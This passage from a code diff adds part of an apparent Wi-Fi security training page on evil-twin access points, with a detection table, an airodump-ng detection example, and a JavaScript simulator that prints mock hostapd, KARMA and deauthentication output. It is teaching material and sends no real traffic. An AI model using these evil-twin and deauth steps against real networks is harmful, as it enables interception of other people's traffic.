+        <div class="sim-clients" id="simClientsSection" style="display:none;">
+          <h4>Connected Clients</h4>
+          <div class="client-list" id="clientList"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 7: Detection -->
+    <section id="detection">
+      <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Detection Method</th><th>Mechanism</th><th>Effectiveness</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>BSSID monitoring</td><td>Multiple APs with same SSID, different BSSID</td><td>High</td></tr>
+            <tr><td>WIPS / WIDS</td><td>Cisco CleanAir, Aruba RFProtect</td><td>Very High</td></tr>
+            <tr><td>Signal anomaly</td><td>New strong AP suddenly appears</td><td>Medium</td></tr>
+            <tr><td>Certificate validation</td><td>TLS cert mismatch warnings</td><td>High (HTTPS)</td></tr>
+            <tr><td>802.1X mutual auth</td><td>Server cert validation in WPA-Enterprise</td><td>Very High</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128274;</span>
+        <div><strong>Best client-side defense:</strong> Use a VPN. Even if tricked into connecting to an evil twin, all traffic remains encrypted. Combined with HTTPS and certificate pinning, the attacker can intercept nothing useful.</div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Detecting evil twins with airodump-ng</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-detect')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-detect"><span class="cmt"># Watch for duplicate SSIDs with different BSSIDs</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng wlan0mon</span>
+
+<span class="out-warn"> BSSID              PWR  Beacons  #Data  CH  ENC   ESSID</span>
+<span class="out"> AA:BB:CC:DD:EE:FF  -45       90    120   6  OPN   CoffeeShop   &lt;-- legitimate</span>
+<span class="out-err"> 11:22:33:44:55:66  -30      200     45   6  OPN   CoffeeShop   &lt;-- EVIL TWIN (stronger signal!)</span>
+
+<span class="cmt"># Same SSID, different BSSID = evil twin indicator</span></div>
+      </div>
+    </section>
+
+    <!-- Nav -->
+    <div class="nav-footer">
+      <a href="../module-08-deauth-dos/" class="nav-btn prev">&#8592; Module 08: Deauth &amp; DoS</a>
+      <a href="../module-10-captive-portal/" class="nav-btn next">Module 10: Captive Portal &#8594;</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  // Copy terminal content
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    const text = el.innerText || el.textContent;
+    navigator.clipboard.writeText(text.trim()).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // Copy config block content
+  function copyConfig(btn, id) {
+    const el = document.getElementById(id);
+    const text = el.innerText || el.textContent;
+    navigator.clipboard.writeText(text.trim()).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // Simulator state
+  let simRunning = false;
+  let connectedClients = [];
+  let deauthTimeout = null;
+
+  function randomMac() {
+    return Array.from({length: 6}, () => Math.floor(Math.random()*256).toString(16).padStart(2,'0').toUpperCase()).join(':');
+  }
+
+  function randomIp() {
+    return '10.0.0.' + (Math.floor(Math.random() * 91) + 10);
+  }
+
+  function appendLine(text) {
+    const output = document.getElementById('etOutput');
+    output.innerHTML += text + '\n';
+    output.scrollTop = output.scrollHeight;
+  }
+
+  function resetSim() {
+    simRunning = false;
+    connectedClients = [];
+    if (deauthTimeout) clearTimeout(deauthTimeout);
+    document.getElementById('etOutput').innerHTML = '<span style="color:var(--text-dim);">Configure the attack above and click "Launch Evil Twin" to begin...</span>';
+    document.getElementById('simClientsSection').style.display = 'none';
+    document.getElementById('clientList').innerHTML = '';
+  }
+
+  function updateClientList() {
+    const list = document.getElementById('clientList');
+    if (connectedClients.length === 0) {
+      list.innerHTML = '<span style="color:var(--text-dim);font-size:12px;">No clients connected yet...</span>';
+      return;
+    }
+    list.innerHTML = connectedClients.map(c =>
+      `<div class="client-item">
+        <div class="client-dot ${c.connected ? '' : 'inactive'}"></div>
+        <span class="client-mac">${c.mac}</span>
+        <span class="client-ip">${c.ip}</span>
+        <span class="client-status ${c.connected ? 'status-connected' : 'status-deauthed'}">${c.connected ? 'CONNECTED' : 'DEAUTHED'}</span>
+      </div>`
+    ).join('');
+  }
+
+  function startEvilTwin() {
+    if (simRunning) return;
+    simRunning = true;
+
+    const ssid = document.getElementById('targetSSID').value || 'CoffeeShop';
+    const bssid = document.getElementById('targetBSSID').value || 'AA:BB:CC:DD:EE:FF';
+    const channel = document.getElementById('targetChannel').value;
+    const mode = document.getElementById('attackMode').value;
+
+    document.getElementById('etOutput').innerHTML = '';
+    document.getElementById('simClientsSection').style.display = 'block';
+    updateClientList();
+
+    appendLine('<span style="color:var(--accent2)">[*]</span> Killing conflicting processes...');
+
+    setTimeout(() => {
+      appendLine('<span style="color:var(--accent2)">[✓]</span> NetworkManager stopped');
+      appendLine('<span style="color:var(--accent2)">[*]</span> Starting hostapd...');
+
+      setTimeout(() => {
+        appendLine(`<span style="color:var(--accent2)">[✓]</span> SSID: <span style="color:var(--accent)">${ssid}</span>  BSSID: <span style="color:var(--accent)">${bssid}</span>  CH: <span style="color:var(--accent)">${channel}</span>`);
+        if (mode === 'karma') {
+          appendLine('<span style="color:var(--warn)">[*]</span> KARMA mode enabled — responding to all probe requests');
+        } else if (mode === 'wpa2') {
+          appendLine('<span style="color:var(--warn)">[*]</span> WPA2-PSK mode — clients must enter passphrase');
+        }
+        appendLine('<span style="color:var(--accent2)">[✓]</span> wlan1: AP-ENABLED');
+        appendLine('<span style="color:var(--accent2)">[*]</span> Starting dnsmasq DHCP/DNS...');
+
+        setTimeout(() => {
+          appendLine('<span style="color:var(--accent2)">[✓]</span> DHCP range: 10.0.0.10 — 10.0.0.100');
+          appendLine('<span style="color:var(--accent2)">[✓]</span> DNS server: 10.0.0.1');
+          appendLine('<span style="color:var(--accent2)">[✓]</span> NAT routing enabled (wlan0 → wlan1)');
+          appendLine('');
+          appendLine('<span style="color:var(--accent2)">Evil twin active — waiting for clients...</span>');
+          appendLine('');
+
+          // Simulate clients connecting over time
+          const delays = [2000, 3500, 5500];
+          delays.forEach((delay, i) => {
+            setTimeout(() => {
+              if (!simRunning) return;
+              const mac = randomMac();
+              const ip = randomIp();
+              const client = { mac, ip, connected: true };
+              connectedClients.push(client);
+
+              appendLine(`<span style="color:var(--accent3)">[+]</span> Client connected: <span style="color:var(--accent)">${mac}</span> → <span style="color:var(--accent2)">${ip}</span>`);
+              if (mode === 'karma') {
+                appendLine(`<span style="color:var(--warn)">    Probe matched: '${ssid}' — auto-connected`);
+              }
+              updateClientList();
+            }, delay);
+          });
+        }, 800);
+      }, 600);
+    }, 400);
+  }
+
+  function deauthVictims() {
+    const ssid = document.getElementById('targetSSID').value || 'CoffeeShop';
+    const bssid = document.getElementById('targetBSSID').value || 'AA:BB:CC:DD:EE:FF';
+    const output = document.getElementById('etOutput');
+
+    if (!simRunning) {
+      appendLine('<span style="color:var(--accent3)">[!]</span> Start the evil twin first.');
+      return;
+    }
+
+    appendLine('');
+    appendLine('<span style="color:var(--accent3)">[*]</span> Launching deauth against legitimate AP...');
+    appendLine(`<span style="color:var(--accent3)">[*]</span> Target BSSID: ${bssid} on channel ${document.getElementById('targetChannel').value}`);
+
+    let count = 0;
+    const interval = setInterval(() => {
+      count += 10;
+      appendLine(`<span style="color:var(--text-dim)">    Sent ${count} deauth frames to broadcast...</span>`);
+      if (count >= 30) {
+        clearInterval(interval);
+        appendLine('<span style="color:var(--accent2)">[✓]</span> Clients disconnecting from legitimate AP...');
+        appendLine('<span style="color:var(--accent2)">[✓]</span> Clients scanning — evil twin signal stronger');
+        appendLine(`<span style="color:var(--accent3)">[+]</span> New victim connecting to "${ssid}"...`);
+
+        setTimeout(() => {
+          const mac = randomMac();
+          const ip = randomIp();
+          connectedClients.push({ mac, ip, connected: true });
+          appendLine(`<span style="color:var(--accent3)">[+]</span> Client captured: <span style="color:var(--accent)">${mac}</span> → <span style="color:var(--accent2)">${ip}</span>`);
+          updateClientList();
+        }, 1000);
+      }
+    }, 400);
+  }
+</script>
+</body>
+</html>
